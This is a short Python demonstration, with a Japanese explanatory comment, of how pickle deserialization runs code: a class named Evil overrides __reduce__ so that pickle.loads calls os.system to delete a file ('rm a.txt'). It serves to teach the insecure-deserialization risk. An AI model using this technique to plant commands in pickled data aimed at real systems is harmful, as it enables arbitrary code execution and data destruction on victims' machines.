import os
import pickle
class Evil(): 
    def __reduce__(self): 
        return (os.system, ('rm a.txt', )) 
x = Evil()
p = pickle.dumps(x)
y = pickle.loads(p)      # "rm a.txt" が実行される


"""
pickle.loadsはデシリアライズする対象クラスの__reduce__関数から返される関数と引数のペアを実行する。
したがって、__reduce__関数をオーバーロードすると任意の関数やコマンドを実行させることができる。
"""